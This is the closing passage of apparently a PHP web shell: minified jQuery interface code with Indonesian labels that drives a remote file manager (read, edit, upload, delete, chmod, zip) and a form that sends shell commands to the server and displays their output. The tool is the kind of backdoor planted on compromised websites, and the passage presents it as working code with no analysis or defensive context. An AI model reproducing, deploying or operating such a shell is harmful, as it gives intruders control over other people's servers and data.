n=t(e.currentTarget).attr("data-tempdir");t.ajax({type:"get",url:"?act=path&dir="+n,beforeSend:function(){t("body").find("#fileman").html(a),t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").hide()},success:function(a){t("body").find("#fileman").html(a),t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").show().find('input[name="xpath"]').val(n),t("form#rqcmd").find('input[name="xpath"]').val(n)}}).done(function(){o(document.querySelectorAll("#showaksi")),t("form#rqcmd").find('input[name="xpath"]').val(n),t("form#rqcmd").parents().find("#hasilcommand").html("")})}),t("button#fmanager").trigger("click"),t('button[data-target="#nav-cmd"]').on("shown.bs.tab",function(a){t("#hasilcommand").hide()}),t('button[data-target="#nav-berkas"]').on("shown.bs.tab",function(a){t("#fberkas").show()}),t('button[data-target="#nav-berkas"]').on("hidden.bs.tab",function(a){t("#fberkas").hide()}),t('button[data-target="#nav-info"]').on("hidden.bs.tab",function(a){t("#nav-info").find("#showinfo").html("")}),t('button[data-target="#nav-info"]').on("shown.bs.tab",function(e){t.ajax({type:"get",url:"?act=info",dataType:"json",beforeSend:function(){t("#nav-info").find("#showinfo").html(a)}}).done(function(a){try{var e=JSON.parse(JSON.stringify(a)),n=t.map(e,function(t,a){return[t]});t("#nav-info").find("#showinfo").html(n.join(""))}catch(i){t("#nav-info").find("#showinfo").html("Error: Gagal menganalisa server!")}})}),t("#fileman").length>0&&(t("#fileman").on("click","a#ffmanager, button#ffmanager",function(a){a.stopPropagation(),r(t(this).attr("data-path"),function(){o(document.querySelectorAll("#showaksi"))})}),t("#fileman").on("click","a#fxmanager",function(a){a.stopPropagation(),r(t(this).attr("data-path"),function(){o(document.querySelectorAll("#showaksi"))})})),t("#showchmod").on("show.bs.modal",function(a){var e=t(a.relatedTarget),n=t(this).find(".modal-body"),i=e.attr("data-xtype"),o=e.attr("data-xname"),r=e.attr("data-xpath"),d=e.attr("data-xperm");n.find('input[name="xtype"]').val(i),n.find('input[name="xname"]').val(o),n.find('input[name="xpath"]').val(r),n.find('input[name="xperm"]').val(d),n.find('input[id="xname"]').val(o),n.find('label[for="xname"]').text(i.toUpperCase())}),t.each(["rqdel","rqzip","rqunzip","rqrename","rqtouch","rqchmod","rqreadfile","rqeditfile","rqnewfile"],function(i,o){t(document).on("submit","form#"+o,function(i){i.preventDefault();var r=t(this),d=t("#modalshowaksi");if(r.find('button[type="submit"]').prop("disabled",!0),"rqrename"==o||"rqtouch"==o)r.find('input[readonly="readonly"]').prop("readonly",!1);else if("rqeditfile"==o||"rqnewfile"==o)var l=e.encode(r.find('textarea[name="xdata"]').val());else if("rqreadfile"==o){var s=r.find('input[name="xpath"]').val();s.length<1?n("Opss!","Isi dulu nama filenya pak!"):(d.modal("show"),d.find(".modal-title").html("View FILE: "+s))}t.ajax({type:"post",url:r.attr("action"),data:"rqeditfile"==o||"rqnewfile"==o?{xdata:l}:r.serialize(),beforeSend:function(){t(a).insertAfter(r)}}).done(function(a){if(r.next("span").remove(),r.find('button[type="submit"]').prop("disabled",!1),"rqreadfile"==o)d.find(".modal-body").attr("style","background:#dfdfdf;").html('<code><pre class="mb-0">'+a+"</pre></code>");else{"rqrename"==o||"rqtouch"==o?r.find('input[readonly="readonly"]').prop("readonly",!0):"rqchmod"==o&&t("body").find("#showchmod").modal("hide"),d.modal("hide"),n("Alert",a);var e=t("#fileman").find("a#ffmanager");e[e.length-1].click(function(t){t.stopPropagation()})}})})}),t(document).on("submit","form#rqchdir",function(a){a.preventDefault();var e=t(this),i=e.find('input[name="xpath"]').val();i.length<1?n("Opss!","Isi dulu nama direktorinya pak!"):(e.find('button[type="submit"]').prop("disabled",!0),r(i,function(){var t=document.querySelectorAll("#showaksi");t.length>0?o(t):n("Error","Direktori tidak ada/ tidak berisi file apapun!")}),e.find('button[type="submit"]').prop("disabled",!1))}),t(document).on("submit","form#rqmkdir",function(e){e.preventDefault();var i=t(this),o=i.find('input[name="xdir"]').val();if(o.length<1)n("Error","Isi dulu nama direktorinya pak!");else if("file"==i.find(":selected").val()){var r=t("#modalshowaksi"),d=i.find('input[name="xpath"]').val();r.modal("show"),r.find(".modal-title").text("FileName: "+o),r.find(".modal-body").html('<form method="post" action="?act=path&dir='+d+"&entry="+o+'&opt=newfile" id="rqnewfile"><div class="d-block mb-3"><textarea name="xdata" class="form-control" style="white-space:pre;" rows="20" placeholder="tulis seperlunya..."></textarea></div><center><button class="btn btn-success text-center" type="submit">Simpan</button></center></form>')}else i.find('button[type="submit"]').prop("disabled",!0),t.ajax({type:"post",url:i.attr("action"),data:i.serialize(),beforeSend:function(){t(a).insertAfter(i)},success:function(a){i.next("span").remove(),i.find('button[type="submit"]').prop("disabled",!1),n("Alert",a);var e=t("#fileman").find("a#ffmanager");e[e.length-1].click(function(t){t.stopPropagation()}),i.next("span#notify").fadeTo(3e3,500).slideUp(500,function(){t(this).slideUp(500)})}})}),t('input[type="file"]').on("change",function(){t("form#rqupload").submit()}),t(document).on("submit","form#rqupload",function(a){a.preventDefault();var e=t(this),i=e.find('input[name="xfile[]"]').prop("files");if(i&&i.length<=0||i.size<1)n("Error","File kosong, gak ada isinya!");else{var o=new FormData(this);e.find('button[type="submit"]').prop("disabled",!0),o.append("xfile",i),t.ajax({type:"post",url:e.attr("action"),data:o,dataType:"text",contentType:!1,processData:!1,beforeSend:function(){e.next("span").remove()},success:function(a){e[0].reset(),e.next("span").remove(),e.find('button[type="submit"]').prop("disabled",!1),n("Alert",a);var i=t("#fileman").find("a#ffmanager");i[i.length-1].click(function(t){t.stopPropagation()})}})}}),t(document).on("submit","form#rqcmd",function(e){e.preventDefault();var n=t(this);n.parents().find("#hasilcommand").show(),n.find('button[type="submit"]').prop("disabled",!0),t.ajax({type:"post",url:n.attr("action"),data:n.serialize(),dataType:"json",beforeSend:function(){n.parents().find("#hasilcommand").html(a)},success:function(t){var a=JSON.parse(JSON.stringify(t));n.find('input[name="xpath"]').val(a.path),n.find('button[type="submit"]').prop("disabled",!1),n.parents().find("#hasilcommand").html('<div class="card mb-3"><div class="card-body p-2 font-weight-light">'+a.stdout+"</div></div>")},error:function(t,a,e){n.find('button[type="submit"]').prop("disabled",!1),n.parents().find("#hasilcommand").html('<div class="card mb-3"><div class="card-body p-2 font-weight-light">'+a+": "+e+"</div></div>")}}).done(function(a){var e=JSON.parse(JSON.stringify(a));t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").find('input[name="xpath"]').val(e.path),t.each(t("body").find("button[data-tempdir]"),function(a,n){t(n).attr("data-tempdir",e.path)}),t.each(t("body").find("a[data-path]"),function(a,n){t(n).attr("data-path",e.path)})})})}(jQuery);</script>
	</body>
</html>
<?php }?>